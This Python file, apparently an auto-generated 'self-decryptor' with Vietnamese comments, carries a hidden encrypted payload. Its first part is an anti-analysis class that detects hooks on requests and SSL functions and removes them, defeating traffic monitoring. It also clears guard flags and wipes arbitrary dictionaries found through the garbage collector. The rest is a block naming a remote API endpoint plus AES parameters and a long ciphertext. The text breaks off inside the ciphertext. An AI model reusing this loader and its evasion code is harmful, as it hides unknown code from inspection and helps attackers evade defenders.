#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File auto-generated - pzm self-decryptor
import requests, struct, base64, json
from argon2.low_level import hash_secret_raw, Type
from ecdsa import VerifyingKey, NIST521p
from Crypto.Cipher import AES

import builtins
import requests
import ssl
import threading
import types
import sys
import hashlib
import inspect
import traceback
from typing import Any, Callable, Dict

# ========================================
# [ANTI-OCAN] - Siêu Giáp Chống Hook Toàn Diện
# ========================================
class AntiOCAN:
    def __init__(self):
        self.original = {
            'request': requests.Session.request if requests else None,
            'ssl_send': ssl.SSLSocket.send,
            'ssl_recv': ssl.SSLSocket.recv,
        }
        
        self.hashes = {k: self._hash(v) for k, v in self.original.items() if v}
        
        self.lock = threading.RLock()
        self.hook_detected = False
        self.unhooked = False
        
        # Bắt đầu tuần tra chống OCAN
        self.start_defense()

    # ====================================
    # 1. Hash hàm để phát hiện thay đổi
    # ====================================
    def _hash(self, obj: Any) -> str:
        if obj is None: return ""
        try:
            if isinstance(obj, types.FunctionType):
                return hashlib.sha256(inspect.getsource(obj).encode()).hexdigest()
            elif hasattr(obj, '__code__'):
                return hashlib.sha256(obj.__code__.co_code).hexdigest()
            else:
                return hashlib.sha256(str(obj).encode()).hexdigest()
        except:
            return hashlib.sha256(repr(obj).encode()).hexdigest()

    # ====================================
    # 2. Dò tìm và gỡ bỏ các lớp bọc (unwrap)
    # ====================================
    def _unwrap(self, func: Callable, max_depth: int = 10) -> Callable:
        current = func
        seen = set()
        for _ in range(max_depth):
            if not callable(current):
                break
            fid = id(current)
            if fid in seen:
                break
            seen.add(fid)
            
            # Kiểm tra xem có phải là safe_hook wrapper không
            if hasattr(current, '__wrapped__'):
                current = current.__wrapped__
                continue
            if hasattr(current, '__code__'):
                code = current.__code__
                if 'hook_guard' in code.co_names or '_HOOK_GUARD' in code.co_names:
                    print("Phát hiện safe_hook wrapper! Đang gỡ...")
                    # Tìm hàm gốc bằng cách đọc source hoặc __wrapped__
                    try:
                        src = inspect.getsource(current)
                        if 'def wrapper' in src and '@safe_hook' in src:
                            # Tìm hàm gốc trong closure
                            if hasattr(current, '__closure__'):
                                for cell in current.__closure__:
                                    if cell.cell_contents is not None and callable(cell.cell_contents):
                                        orig = cell.cell_contents
                                        if self._hash(orig) == self.hashes.get('request') or \
                                           self._hash(orig) == self.hashes.get('ssl_send') or \
                                           self._hash(orig) == self.hashes.get('ssl_recv'):
                                            return orig
                    except: pass
            current = getattr(current, '__wrapped__', current)
        return func

    # ====================================
    # 3. Khôi phục requests
    # ====================================
    def protect_requests(self):
        if not self.original['request']: return
        current = requests.Session.request
        if self._hash(current) != self.hashes['request']:
            print("OCAN hook requests! Đang khôi phục...")
            unwrapped = self._unwrap(current)
            requests.Session.request = unwrapped
            self.hook_detected = True
            self.unhooked = True

    # ====================================
    # 4. Khôi phục SSL
    # ====================================
    def protect_ssl(self):
        for method in ['send', 'recv']:
            orig = self.original[f'ssl_{method}']
            current = getattr(ssl.SSLSocket, method)
            if self._hash(current) != self.hashes[f'ssl_{method}']:
                print(f"OCAN hook ssl.{method}! Đang khôi phục...")
                unwrapped = self._unwrap(current)
                setattr(ssl.SSLSocket, method, unwrapped)
                self.hook_detected = True
                self.unhooked = True

    # ====================================
    # 5. Vô hiệu hóa _HOOK_GUARD (reentrancy guard)
    # ====================================
    def disable_hook_guard(self):
        try:
            # Xóa _HOOK_GUARD khỏi thread
            for t in threading.enumerate():
                if hasattr(t, '_HOOK_GUARD'):
                    delattr(t, '_HOOK_GUARD')

            # Làm sạch thread-local
            if hasattr(threading, 'local'):
                tls = threading.local()
                if hasattr(tls, '_HOOK_GUARD'):
                    tls._HOOK_GUARD = False

            # Xóa global guard dict
            import gc
            for obj in gc.get_objects():
                if isinstance(obj, dict) and len(obj) < 100:
                    if any(isinstance(k, int) for k in obj.keys()):  # thread ID
                        if any(v is True for v in obj.values()):
                            obj.clear()
        except:
            pass

    # ====================================
    # 6. Tuần tra định kỳ (mỗi 1.5s)
    # ====================================
    def patrol(self):
        with self.lock:
            self.protect_requests()
            self.protect_ssl()
            if not self.unhooked:
                self.disable_hook_guard()

    def start_defense(self):
        def watcher():
            import time
            while True:
                try:
                    self.patrol()
                except: pass
                time.sleep(1.5)
        thread = threading.Thread(target=watcher, daemon=True)
        thread.start()

    # ====================================
    # 7. Báo cáo
    # ====================================
    def status(self) -> Dict[str, Any]:
        return {
            "ocan_detected": self.hook_detected,
            "requests_clean": requests.Session.request == self.original['request'] if self.original['request'] else True,
            "ssl_clean": (
                ssl.SSLSocket.send == self.original['ssl_send'] and
                ssl.SSLSocket.recv == self.original['ssl_recv']
            ),
            "unhooked": self.unhooked
        }

# ========================================
# KHỞI TẠO SIÊU GIÁP CHỐNG OCAN
# ========================================
anti_ocan = AntiOCAN()




META = {
  "enc_id": "2979",
  "api_url": "https://api-l7k1.onrender.com/data",
  "salt_b64": "emzEqZCf6S7TqiHANowNUw==",
  "nonce_b64": "aGGiJ0moA7HDPf5R",
  "tag_b64": "K0G2zOLkRq7T0gYF3p4RTg==",
  "cipher_b64": "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